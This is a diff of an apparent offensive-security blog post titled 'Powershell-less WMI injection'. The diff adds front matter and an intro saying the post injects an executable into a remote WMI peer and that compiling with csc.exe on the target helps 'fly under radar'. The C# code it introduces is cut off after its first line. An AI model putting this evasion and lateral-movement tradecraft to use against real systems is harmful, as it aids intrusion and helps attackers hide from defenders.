@@ -1,4 +1,9 @@
-When PowerShell fails, this might help you to inject exe to your WMI peer
+---
+layout: post
+title: Powershell-less WMI injection
+---
+
+When PowerShell fails, this might help you to inject exe to your WMI peer, just compile it with CSC (C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe) on target computer, you should able to fly under radar.
 
 ```
 using System;
